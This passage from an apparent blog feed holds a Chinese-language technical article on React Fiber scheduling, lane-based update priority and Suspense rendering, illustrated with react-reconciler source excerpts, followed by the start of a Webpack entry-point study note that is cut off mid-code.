ensureRootIsScheduled -&gt; ensureScheduleIsScheduled -&gt; scheduleImmediateRootScheduleTask -&gt; unstable_scheduleCallback -&gt; requestHostCallback -&gt; schedulePerformWorkUntilDeadline -&gt; port2.<span class="hljs-property">postMessage</span> -&gt; port1.<span class="hljs-property">onmessage</span> -&gt; performWorkUntilDeadline -&gt; flushWork<br><br><span class="hljs-title class_">Component</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">setState</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">partialState, callback</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">updater</span>.<span class="hljs-title function_">enqueueSetState</span>(<span class="hljs-variable language_">this</span>, partialState, callback, <span class="hljs-string">&#x27;setState&#x27;</span>);<br>&#125;;<br></code></pre></td></tr></table></figure><p>class 组件在继承 React.Component 时通过 constructor 指定 <code>instance.updater = classComponentUpdater</code>，enqueueSetState 就是 classComponentUpdater 对象的属性方法</p><p>任务调度（unstable_scheduleCallback）到任务执行（performUnitOfWork）的关键在于 flushWork 中 <code>currentTask.callback</code> 的执行。currentTask.callback 是调用 unstable_scheduleCallback 时传入的第二个参数（<code>unstable_scheduleCallback(ImmediateSchedulerPriority, processRootScheduleInImmediateTask)</code>）:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">processRootScheduleInImmediateTask -&gt; performWorkOnRoot -&gt; renderRootConcurrent -&gt; workLoopConcurrentByScheduler -&gt; performUnitOfWork<br></code></pre></td></tr></table></figure><p>此外，performWorkOnRoot 函数内在执行完 renderRootConcurrent 后会返回 exitStatus 值，用于判断完成状态，调用 finishConcurrentRender 后提交 commitRoot</p><h2 id="4-2-并发模式（Concurrent-Mode）的底层支持"><a href="#4-2-并发模式（Concurrent-Mode）的底层支持" class="headerlink" title="4.2 并发模式（Concurrent Mode）的底层支持"></a>4.2 并发模式（Concurrent Mode）的底层支持</h2><h3 id="高优先级更新的插队机制（如用户输入）"><a href="#高优先级更新的插队机制（如用户输入）" class="headerlink" title="高优先级更新的插队机制（如用户输入）"></a>高优先级更新的插队机制（如用户输入）</h3><p>Fiber 高优先级任务的插队机制 是并发模式（Concurrent Mode）的核心特性之一，它允许高优先级任务（如用户交互）中断正在执行的低优先级任务（如数据加载）</p><p>以 setState 举例说明高优先级更新的插队机制</p><p><strong>任务调度</strong></p><p>当触发 setState 更新时：</p><ol><li>创建 update 对象并标记 lane</li><li>调用 scheduleUpdateOnFiber 向上收集优先级到 root.pendingLanes</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">enqueueSetState</span>(<span class="hljs-params">inst: any, payload: any, callback</span>) &#123;<br>  <span class="hljs-keyword">const</span> fiber = <span class="hljs-title function_">getInstance</span>(inst);<br>  <span class="hljs-keyword">const</span> lane = <span class="hljs-title function_">requestUpdateLane</span>(fiber);<br>  <br>  <span class="hljs-keyword">const</span> update = <span class="hljs-title function_">createUpdate</span>(lane);<br>  update.<span class="hljs-property">payload</span> = payload;<br>  <span class="hljs-keyword">if</span> (callback !== <span class="hljs-literal">undefined</span> &amp;&amp; callback !== <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">if</span> (__DEV__) &#123;<br>      <span class="hljs-title function_">warnOnInvalidCallback</span>(callback);<br>    &#125;<br>    update.<span class="hljs-property">callback</span> = callback;<br>  &#125;<br><br>  <span class="hljs-keyword">const</span> root = <span class="hljs-title function_">enqueueUpdate</span>(fiber, update, lane);<br>  <span class="hljs-keyword">if</span> (root !== <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-title function_">startUpdateTimerByLane</span>(lane, <span class="hljs-string">&#x27;this.setState()&#x27;</span>);<br>    <span class="hljs-title function_">scheduleUpdateOnFiber</span>(root, fiber, lane);<br>    <span class="hljs-title function_">entangleTransitions</span>(root, fiber, lane);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (enableSchedulingProfiler) &#123;<br>    <span class="hljs-title function_">markStateUpdateScheduled</span>(fiber, lane);<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// react-reconciler/src/ReactFiberWorkLoop.js</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">scheduleUpdateOnFiber</span>(<span class="hljs-params">root, fiber, lane</span>) &#123;<br>  <span class="hljs-comment">// Mark that the root has a pending update.</span><br>  <span class="hljs-title function_">markRootUpdated</span>(root, lane); <span class="hljs-comment">// 更新 root.pendingLanes</span><br>  <span class="hljs-title function_">ensureRootIsScheduled</span>(root); <span class="hljs-comment">// 触发调度</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ensureRootIsScheduled</span>(<span class="hljs-params">root: FiberRoot</span>): <span class="hljs-keyword">void</span> &#123;<br>  mightHavePendingSyncWork = <span class="hljs-literal">true</span>;<br>  <span class="hljs-title function_">ensureScheduleIsScheduled</span>();<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ensureScheduleIsScheduled</span>(<span class="hljs-params"></span>): <span class="hljs-keyword">void</span> &#123;<br>  <span class="hljs-comment">// 在当前事件结束时，遍历每个根，并确保以正确的优先级为每个根安排了一个任务</span><br>  <span class="hljs-comment">// didScheduleMicrotask 用于防止调度冗余的 mircotask</span><br>  <span class="hljs-keyword">if</span> (__DEV__ &amp;&amp; <span class="hljs-title class_">ReactSharedInternals</span>.<span class="hljs-property">actQueue</span> !== <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-comment">// We&#x27;re inside an `act` scope.</span><br>    <span class="hljs-keyword">if</span> (!didScheduleMicrotask_act) &#123;<br>      didScheduleMicrotask_act = <span class="hljs-literal">true</span>;<br>      <span class="hljs-title function_">scheduleImmediateRootScheduleTask</span>();<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> (!didScheduleMicrotask) &#123;<br>      didScheduleMicrotask = <span class="hljs-literal">true</span>;<br>      <span class="hljs-title function_">scheduleImmediateRootScheduleTask</span>();<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">scheduleImmediateRootScheduleTask</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">if</span> (supportsMicrotasks) &#123;<br>    <span class="hljs-title function_">scheduleMicrotask</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-title function_">processRootScheduleInMicrotask</span>();<br>    &#125;);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// If microtasks are not supported, use Scheduler.</span><br>    <span class="hljs-title class_">Scheduler</span>_scheduleCallback(<br>      <span class="hljs-title class_">ImmediateSchedulerPriority</span>,<br>      processRootScheduleInImmediateTask,<br>    );<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>中断低优先级任务（scheduleTaskForRootDuringMicrotask）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">processRootScheduleInMicrotask</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">let</span> prev = <span class="hljs-literal">null</span>;<br>  <span class="hljs-comment">// 1. 遍历全局调度链表（firstScheduledRoot → lastScheduledRoot）</span><br>  <span class="hljs-keyword">let</span> root = firstScheduledRoot;<br>  <span class="hljs-keyword">while</span> (root !== <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">const</span> next = root.<span class="hljs-property">next</span>;<br>    <span class="hljs-keyword">const</span> nextLanes = <span class="hljs-title function_">scheduleTaskForRootDuringMicrotask</span>(root, currentTime);<br>    <span class="hljs-keyword">if</span> (nextLanes === <span class="hljs-title class_">NoLane</span>) &#123;<br>      root.<span class="hljs-property">next</span> = <span class="hljs-literal">null</span>;<br>      <span class="hljs-keyword">if</span> (prev === <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">// This is the new head of the list</span><br>        firstScheduledRoot = next;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        prev.<span class="hljs-property">next</span> = next;<br>      &#125;<br>      <span class="hljs-keyword">if</span> (next === <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">// This is the new tail of the list</span><br>        lastScheduledRoot = prev;<br>      &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-comment">// This root still has work. Keep it in the list.</span><br>      prev = root;<br>      <span class="hljs-keyword">if</span> (<br>        syncTransitionLanes !== <span class="hljs-title class_">NoLanes</span> ||<br>        <span class="hljs-title function_">includesSyncLane</span>(nextLanes) ||<br>        (enableGestureTransition &amp;&amp; <span class="hljs-title function_">isGestureRender</span>(nextLanes))<br>      ) &#123;<br>        mightHavePendingSyncWork = <span class="hljs-literal">true</span>;<br>      &#125;<br>    &#125;<br>    root = next;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">scheduleTaskForRootDuringMicrotask</span>(<span class="hljs-params"></span><br><span class="hljs-params">  root: FiberRoot,</span><br><span class="hljs-params">  currentTime: number,</span><br><span class="hljs-params"></span>): <span class="hljs-title class_">Lane</span> &#123;<br>  <span class="hljs-title function_">markStarvedLanesAsExpired</span>(root, currentTime);<br>  <span class="hljs-keyword">const</span> nextLanes = <span class="hljs-title function_">getNextLanes</span>(<br>    root,<br>    root === workInProgressRoot ? workInProgressRootRenderLanes : <span class="hljs-title class_">NoLanes</span>,<br>    rootHasPendingCommit);<br>  <br>  <span class="hljs-keyword">const</span> existingCallbackNode = root.<span class="hljs-property">callbackNode</span>;<br>  <span class="hljs-keyword">if</span> (<br>    nextLanes === <span class="hljs-title class_">NoLanes</span> ||<br>    (root === workInProgressRoot &amp;&amp; <span class="hljs-title function_">isWorkLoopSuspendedOnData</span>()) ||<br>    root.<span class="hljs-property">cancelPendingCommit</span> !== <span class="hljs-literal">null</span><br>  ) &#123;<br>    <span class="hljs-comment">// Fast path: There&#x27;s nothing to work on.</span><br>    <span class="hljs-keyword">if</span> (existingCallbackNode !== <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-title function_">cancelCallback</span>(existingCallbackNode);<br>    &#125;<br>    root.<span class="hljs-property">callbackNode</span> = <span class="hljs-literal">null</span>;<br>    root.<span class="hljs-property">callbackPriority</span> = <span class="hljs-title class_">NoLane</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">NoLane</span>;<br>  &#125;<br>  <br>  <span class="hljs-keyword">if</span> (<br>    <span class="hljs-title function_">includesSyncLane</span>(nextLanes) &amp;&amp;<br>    <span class="hljs-comment">// If we&#x27;re prerendering, then we should use the concurrent work loop</span><br>    <span class="hljs-comment">// even if the lanes are synchronous, so that prerendering never blocks</span><br>    <span class="hljs-comment">// the main thread.</span><br>    !<span class="hljs-title function_">checkIfRootIsPrerendering</span>(root, nextLanes)<br>  ) &#123;<br>    <span class="hljs-comment">// Synchronous work is always flushed at the end of the microtask, so we</span><br>    <span class="hljs-comment">// don&#x27;t need to schedule an additional task.</span><br>    <span class="hljs-keyword">if</span> (existingCallbackNode !== <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-title function_">cancelCallback</span>(existingCallbackNode);<br>    &#125;<br>    root.<span class="hljs-property">callbackPriority</span> = <span class="hljs-title class_">SyncLane</span>;<br>    root.<span class="hljs-property">callbackNode</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">SyncLane</span>;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// We use the highest priority lane to represent the priority of the callback.</span><br>    <span class="hljs-keyword">const</span> existingCallbackPriority = root.<span class="hljs-property">callbackPriority</span>;<br>    <span class="hljs-keyword">const</span> newCallbackPriority = <span class="hljs-title function_">getHighestPriorityLane</span>(nextLanes);<br><br>    <span class="hljs-keyword">if</span> (<br>      newCallbackPriority === existingCallbackPriority &amp;&amp;<br>      <span class="hljs-comment">// Special case related to `act`. If the currently scheduled task is a</span><br>      <span class="hljs-comment">// Scheduler task, rather than an `act` task, cancel it and re-schedule</span><br>      <span class="hljs-comment">// on the `act` queue.</span><br>      !(<br>        __DEV__ &amp;&amp;<br>        <span class="hljs-title class_">ReactSharedInternals</span>.<span class="hljs-property">actQueue</span> !== <span class="hljs-literal">null</span> &amp;&amp;<br>        existingCallbackNode !== fakeActCallbackNode<br>      )<br>    ) &#123;<br>      <span class="hljs-comment">// The priority hasn&#x27;t changed. We can reuse the existing task.</span><br>      <span class="hljs-keyword">return</span> newCallbackPriority;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-comment">// Cancel the existing callback. We&#x27;ll schedule a new one below.</span><br>      <span class="hljs-title function_">cancelCallback</span>(existingCallbackNode);<br>    &#125;<br><br>    <span class="hljs-keyword">const</span> newCallbackNode = <span class="hljs-title function_">scheduleCallback</span>(<br>      schedulerPriorityLevel,<br>      performWorkOnRootViaSchedulerTask.<span class="hljs-title function_">bind</span>(<span class="hljs-literal">null</span>, root),<br>    );<br><br>    root.<span class="hljs-property">callbackPriority</span> = newCallbackPriority;<br>    root.<span class="hljs-property">callbackNode</span> = newCallbackNode;<br>    <span class="hljs-keyword">return</span> newCallbackPriority;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>插队机制关键解析</strong></p><p>（1）标记过期任务</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">markStarvedLanesAsExpired</span>(root, currentTime);<br></code></pre></td></tr></table></figure><ul><li>作用：检查 root.pendingLanes 中是否有低优先级任务因长期未执行而“饿死”（超过 timeout 未处理）</li><li>插队机制：将过期的低优先级任务标记为 expiredLanes 使其升级为同步优先级（SyncLane）从而获得立即执行的机会</li></ul><p>（2）计算下一个要处理的 lanes（getNextLanes）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> nextLanes = <span class="hljs-title function_">getNextLanes</span>(<br>  root,<br>  root === workInProgressRoot ? workInProgressRootRenderLanes : <span class="hljs-title class_">NoLanes</span>,<br>  rootHasPendingCommit<br>);<br></code></pre></td></tr></table></figure><ul><li>优先级比较：从 pendingLanes 中选择最高优先级的 lanes，规则包括：<ul><li>优先选择已过期的 expiredLanes（相当于强制插队）</li><li>然后选择用户交互相关的 InputContinuousLane 或 DefaultLane</li><li>避免与正在进行的渲染任务冲突</li></ul></li></ul><p>（3）中断低优先级</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">if</span> (existingCallbackNode !== <span class="hljs-literal">null</span>) &#123;<br>  <span class="hljs-title function_">cancelCallback</span>(existingCallbackNode); <span class="hljs-comment">// 取消当前正在执行的低优先级任务</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>当检测到更高优先级的 newCallbackPriority 时，立即取消当前任务的回调执行。</li></ul><p>（4）调度新任务</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> newCallbackNode = <span class="hljs-title function_">scheduleCallback</span>(<br>  schedulerPriorityLevel,<br>  performWorkOnRootViaSchedulerTask.<span class="hljs-title function_">bind</span>(<span class="hljs-literal">null</span>, root)<br>);<br></code></pre></td></tr></table></figure><h3 id="Suspense的异步渲染流程"><a href="#Suspense的异步渲染流程" class="headerlink" title="Suspense的异步渲染流程"></a>Suspense的异步渲染流程</h3><p>Suspense 的异步渲染流程主要围绕 <code>异步数据加载</code> 和 <code>懒加载组件（Code Splitting）</code> 两大场景展开。Suspense 的工作原理是捕获子组件抛出的 Promise，并在 Promise 未完成时显示 fallback UI。</p><p>其异步状态管理的逻辑如下：</p><ul><li>当子组件（如 lazy 组件或使用 use Hook 的组件）需要等待异步操作（如数据加载或代码加载）时，它会 抛出一个 Promise。</li><li>Suspense 会捕获这个 Promise，并进入 挂起（Suspended）状态，显示 fallback UI。</li><li>当 Promise 完成（resolve 或 reject），React 会重新尝试渲染子组件。</li></ul><p><strong>渲染流程详解</strong></p><p>（1）Code Splitting（懒加载组件）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">LazyComponent</span> = <span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&quot;./Component&quot;</span>));<br></code></pre></td></tr></table></figure><ul><li>lazy 返回一个特殊对象（LazyComponent），包含 <code>_status</code>（<code>Pending/Resolved/Rejected</code>）和 <code>_result</code>（加载的模块）。</li><li>首次渲染时，readLazyComponentType 检查状态：<ul><li>若 Pending，抛出 thenable（Promise），触发 Suspense 显示 fallback。</li><li>若 Resolved，返回模块并渲染</li></ul></li></ul><p>（2）数据获取（Async Data Fetching）<br>实验性 API <code>unstable_createResource</code> 允许在组件内同步读取异步数据：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> resource = <span class="hljs-title function_">unstable_createResource</span>(fetchData);<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">MyComponent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> data = resource.<span class="hljs-title function_">read</span>(id); <span class="hljs-comment">// 可能抛出 Promise</span><br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&#123;data&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>resource.read 检查缓存：<ul><li>若数据未加载，抛出 Promise，Suspense 捕获并显示 fallback。</li><li>若数据已加载，直接返回6。</li></ul></li><li>React 在微任务阶段重新尝试渲染完成加载的组件</li></ul><h2 id="4-3-实际案例：startTransition的工作原理"><a href="#4-3-实际案例：startTransition的工作原理" class="headerlink" title="4.3 实际案例：startTransition的工作原理"></a>4.3 实际案例：startTransition的工作原理</h2><h1 id="第五章：Fiber的渲染流程剖析"><a href="#第五章：Fiber的渲染流程剖析" class="headerlink" title="第五章：Fiber的渲染流程剖析"></a>第五章：Fiber的渲染流程剖析</h1><h2 id="5-1-两阶段提交模型详解"><a href="#5-1-两阶段提交模型详解" class="headerlink" title="5.1 两阶段提交模型详解"></a>5.1 两阶段提交模型详解</h2><h3 id="Render阶段（可中断）：Reconciliation与Effect收集"><a href="#Render阶段（可中断）：Reconciliation与Effect收集" class="headerlink" title="Render阶段（可中断）：Reconciliation与Effect收集"></a>Render阶段（可中断）：Reconciliation与Effect收集</h3><h3 id="Commit阶段（不可中断）：DOM更新与生命周期执行"><a href="#Commit阶段（不可中断）：DOM更新与生命周期执行" class="headerlink" title="Commit阶段（不可中断）：DOM更新与生命周期执行"></a>Commit阶段（不可中断）：DOM更新与生命周期执行</h3><h2 id="5-2-双缓存树切换的完整流程"><a href="#5-2-双缓存树切换的完整流程" class="headerlink" title="5.2 双缓存树切换的完整流程"></a>5.2 双缓存树切换的完整流程</h2><h3 id="从WorkInProgress树到Current树的切换时机"><a href="#从WorkInProgress树到Current树的切换时机" class="headerlink" title="从WorkInProgress树到Current树的切换时机"></a>从WorkInProgress树到Current树的切换时机</h3><h3 id="错误边界与渲染恢复机制"><a href="#错误边界与渲染恢复机制" class="headerlink" title="错误边界与渲染恢复机制"></a>错误边界与渲染恢复机制</h3><h1 id="第六章：Fiber的性能优化实践"><a href="#第六章：Fiber的性能优化实践" class="headerlink" title="第六章：Fiber的性能优化实践"></a>第六章：Fiber的性能优化实践</h1><h2 id="6-1-减少协调开销的优化策略"><a href="#6-1-减少协调开销的优化策略" class="headerlink" title="6.1 减少协调开销的优化策略"></a>6.1 减少协调开销的优化策略</h2><h3 id="React-memo、useMemo、useCallback的原理与误用"><a href="#React-memo、useMemo、useCallback的原理与误用" class="headerlink" title="React.memo、useMemo、useCallback的原理与误用"></a>React.memo、useMemo、useCallback的原理与误用</h3><h3 id="不可变数据与SCU（shouldComponentUpdate）优化"><a href="#不可变数据与SCU（shouldComponentUpdate）优化" class="headerlink" title="不可变数据与SCU（shouldComponentUpdate）优化"></a>不可变数据与SCU（shouldComponentUpdate）优化</h3><h2 id="6-2-调试工具与性能分析"><a href="#6-2-调试工具与性能分析" class="headerlink" title="6.2 调试工具与性能分析"></a>6.2 调试工具与性能分析</h2><h3 id="React-DevTools的Fiber树-inspection"><a href="#React-DevTools的Fiber树-inspection" class="headerlink" title="React DevTools的Fiber树 inspection"></a>React DevTools的Fiber树 inspection</h3><h3 id="使用Profiler-API定位渲染瓶颈"><a href="#使用Profiler-API定位渲染瓶颈" class="headerlink" title="使用Profiler API定位渲染瓶颈"></a>使用Profiler API定位渲染瓶颈</h3><h1 id="第七章：Fiber的延伸与生态系统影响"><a href="#第七章：Fiber的延伸与生态系统影响" class="headerlink" title="第七章：Fiber的延伸与生态系统影响"></a>第七章：Fiber的延伸与生态系统影响</h1><h2 id="7-1-Fiber架构的通用性设计"><a href="#7-1-Fiber架构的通用性设计" class="headerlink" title="7.1 Fiber架构的通用性设计"></a>7.1 Fiber架构的通用性设计</h2><h3 id="自定义渲染器（如React-Three-Fiber）的实现原理"><a href="#自定义渲染器（如React-Three-Fiber）的实现原理" class="headerlink" title="自定义渲染器（如React Three Fiber）的实现原理"></a>自定义渲染器（如React Three Fiber）的实现原理</h3><h3 id="非DOM环境（React-Native）的Fiber适配"><a href="#非DOM环境（React-Native）的Fiber适配" class="headerlink" title="非DOM环境（React Native）的Fiber适配"></a>非DOM环境（React Native）的Fiber适配</h3><h2 id="7-2-其他框架的借鉴与对比"><a href="#7-2-其他框架的借鉴与对比" class="headerlink" title="7.2 其他框架的借鉴与对比"></a>7.2 其他框架的借鉴与对比</h2><h3 id="Vue-3的调度器设计-vs-React-Fiber"><a href="#Vue-3的调度器设计-vs-React-Fiber" class="headerlink" title="Vue 3的调度器设计 vs React Fiber"></a>Vue 3的调度器设计 vs React Fiber</h3><h3 id="Svelte的编译时优化与运行时调度的取舍"><a href="#Svelte的编译时优化与运行时调度的取舍" class="headerlink" title="Svelte的编译时优化与运行时调度的取舍"></a>Svelte的编译时优化与运行时调度的取舍</h3><h1 id="第八章：从源码角度理解Fiber"><a href="#第八章：从源码角度理解Fiber" class="headerlink" title="第八章：从源码角度理解Fiber"></a>第八章：从源码角度理解Fiber</h1><h2 id="8-1-关键源码文件导读"><a href="#8-1-关键源码文件导读" class="headerlink" title="8.1 关键源码文件导读"></a>8.1 关键源码文件导读</h2><h3 id="react-reconciler包的核心逻辑"><a href="#react-reconciler包的核心逻辑" class="headerlink" title="react-reconciler包的核心逻辑"></a>react-reconciler包的核心逻辑</h3><h3 id="beginWork、completeWork函数解析"><a href="#beginWork、completeWork函数解析" class="headerlink" title="beginWork、completeWork函数解析"></a>beginWork、completeWork函数解析</h3><h2 id="8-2-手写迷你Fiber引擎"><a href="#8-2-手写迷你Fiber引擎" class="headerlink" title="8.2 手写迷你Fiber引擎"></a>8.2 手写迷你Fiber引擎</h2><h3 id="实现一个简化版Fiber调度器（300行代码Demo）"><a href="#实现一个简化版Fiber调度器（300行代码Demo）" class="headerlink" title="实现一个简化版Fiber调度器（300行代码Demo）"></a>实现一个简化版Fiber调度器（300行代码Demo）</h3>]]></content>
    
    
    <categories>
      
      <category>React</category>
      
    </categories>
    
    
    <tags>
      
      <tag>React</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Webpack 学习笔记</title>
    <link href="/2025/05/29/Webpack%20Study%20Notes/"/>
    <url>/2025/05/29/Webpack%20Study%20Notes/</url>
    
    <content type="html"><![CDATA[<h2 id="入口起点（entry-point）"><a href="#入口起点（entry-point）" class="headerlink" title="入口起点（entry point）"></a>入口起点（entry point）</h2><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p>语法：entry: string | [string] | { <entryChunkName> string | [string] } | {}</p><p><strong>webpack.config.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs Javascript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">entry</span>: &#123;<br>    <span class="hljs-attr">app</span>: <span class="hljs-string">&#x27;./src/app.js&#x27;</span>,<br>    <span class="hljs-attr">file</span>: [<span class="hljs-string">&#x27;./src/file_1.js&#x27;</span>, <span class="hljs-string">&#x27;./src/file_2.js&#x27;</span>],<br>    <span class="hljs-attr">a1</span>: &#123;<br>      <span class="hljs-attr">dependOn</span>: <span class="hljs-string">&#x27;app&#x27;</span>, <span class="hljs-comment">// 当前入口所依赖的入口。它们必须在该入口被加载前被加载。</span><br>      <span class="hljs-attr">filename</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-comment">// 